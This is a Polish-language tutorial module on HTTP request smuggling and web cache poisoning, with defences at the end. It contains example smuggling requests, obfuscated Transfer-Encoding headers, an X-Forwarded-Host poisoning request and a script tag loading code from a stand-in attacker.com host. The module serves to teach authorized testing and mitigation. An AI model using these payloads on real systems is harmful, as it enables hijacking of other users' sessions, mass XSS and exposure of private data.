---
id: "request-smuggling-cache-poisoning"
title: "[Zaawansowane] HTTP Request Smuggling i Web Cache Poisoning"
sidebar_position: 21
---

# [Zaawansowane] HTTP Request Smuggling i Web Cache Poisoning

To moduł dla zaawansowanych. Obie techniki wykorzystują **rozbieżności w interpretacji żądań** między warstwami infrastruktury (front-end/proxy/CDN a serwer back-end). Pozwalają zatruwać kolejkę żądań innych użytkowników, omijać kontrole bezpieczeństwa i masowo serwować złośliwą treść.

---

## 🚇 HTTP Request Smuggling

Współczesne aplikacje stoją za łańcuchem serwerów (CDN → reverse proxy → serwer aplikacyjny). Jeśli dwa serwery **różnie określają, gdzie kończy się jedno żądanie, a zaczyna następne**, atakujący może „przemycić" fragment żądania, który front-end widzi jako część jednego żądania, a back-end interpretuje jako początek kolejnego.

### **1️⃣ Źródło problemu: CL vs TE**
Granicę treści żądania można wskazać dwoma nagłówkami:
- `Content-Length` (CL) – liczba bajtów,
- `Transfer-Encoding: chunked` (TE) – treść dzielona na kawałki.

Gdy front-end ufa jednemu, a back-end drugiemu, powstają warianty:

**CL.TE** – front-end używa `Content-Length`, back-end `Transfer-Encoding`:
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL** – odwrotnie. **TE.TE** – jeden z serwerów daje się zmusić do zignorowania `Transfer-Encoding` przez jego obfuskację:
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:\tchunked
```

### **2️⃣ HTTP/2 Downgrade (H2.CL / H2.TE)**
Nowoczesny wariant: front-end mówi HTTP/2, ale tłumaczy ruch na HTTP/1.1 do back-endu. Niespójność długości po downgradzie umożliwia smuggling nawet tam, gdzie HTTP/1.1 jest „bezpieczny".

### **3️⃣ Wpływ**
- przejęcie żądań innych użytkowników (kradzież ciasteczek, tokenów),
- obejście kontroli front-endu (dostęp do ścieżek blokowanych przez proxy),
- „uzbrojenie" cache poisoningu,
- masowy reflected XSS na cudzych żądaniach.

### **4️⃣ Wykrywanie**
Manualne testy są ryzykowne (mogą wpłynąć na innych użytkowników). Bezpieczniej zacząć od techniki **time-based** i automatyzacji:
- **Burp Suite** – rozszerzenie **HTTP Request Smuggler** (Active Scan, „smuggle probe").
- **Burp Repeater** – tryb HTTP/1.1 z wyłączonym automatycznym `Content-Length`.

> Request smuggling wpływa na ruch **innych** użytkowników. Testuj wyłącznie w autoryzowanym zakresie i preferuj nieszkodliwe sondy (np. opóźnienia), nie destrukcyjne payloady.

---

##  Web Cache Poisoning

Atak polega na zmuszeniu pamięci podręcznej (CDN, reverse proxy) do **zapisania złośliwej odpowiedzi**, która następnie jest serwowana wielu użytkownikom.

### **1️⃣ Mechanizm: unkeyed input**
Cache rozróżnia odpowiedzi po **kluczu** (zwykle metoda + host + ścieżka + część parametrów). Wejścia **nieobjęte kluczem** (unkeyed), które jednak wpływają na odpowiedź, to wektor zatrucia — np. nagłówki:
```http
GET /home HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```
Jeśli aplikacja odbija `X-Forwarded-Host` w treści (np. w generowanym URL skryptu), a cache go ignoruje przy kluczowaniu — zatruta strona z `//attacker.com/script.js` trafi do wszystkich:
```html
<script src="//attacker.com/evil.js"></script>
```

### **2️⃣ Typowe unkeyed wektory**
`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Original-URL`, nagłówki własne aplikacji, czasem cookies.

### **3️⃣ Cache Key Manipulation / Cache Deception**
**Web Cache Deception** – nakłonienie cache do zapisania prywatnej, uwierzytelnionej odpowiedzi pod publicznym URL-em:
```
https://example.com/account/profile/nonexistent.css
```
Jeśli serwer zwróci profil ofiary, a cache zapisze go jako statyczny `.css` (po rozszerzeniu) — atakujący odczyta cudze dane pod tym URL-em.

### **4️⃣ Wykrywanie**
- Obserwuj nagłówki: `X-Cache: hit/miss`, `Age`, `Cache-Control`, `Vary`.
- **Param Miner** (rozszerzenie Burp) – automatyczne wykrywanie unkeyed nagłówków/parametrów.
- Dodaj „cache buster" (`?cb=123`) podczas testów, by nie zatruwać produkcyjnego cache dla realnych użytkowników.

---

##  Jak się bronić?
✅ **Ujednolić parsowanie żądań** w całym łańcuchu; preferować **HTTP/2 end-to-end** bez downgrade'u.
✅ **Odrzucać niejednoznaczne żądania** (jednoczesne CL i TE, zduplikowane nagłówki).
✅ **Cache:** włączać do **klucza** wszystkie wejścia wpływające na odpowiedź; nie odbijać nieuwierzytelnionych nagłówków.
✅ **Cache Deception:** cache'ować po `Content-Type`/rzeczywistej trasie, nie po rozszerzeniu w URL; oznaczać prywatne odpowiedzi `Cache-Control: no-store`.
✅ **Normalizować nagłówki na brzegu** (WAF/CDN) i ograniczać zaufanie do `X-Forwarded-*`.

---

To zamyka klaster podatności webowych. Kolejnym krokiem będzie **Automatyzacja i eksploatacja**! 🚀
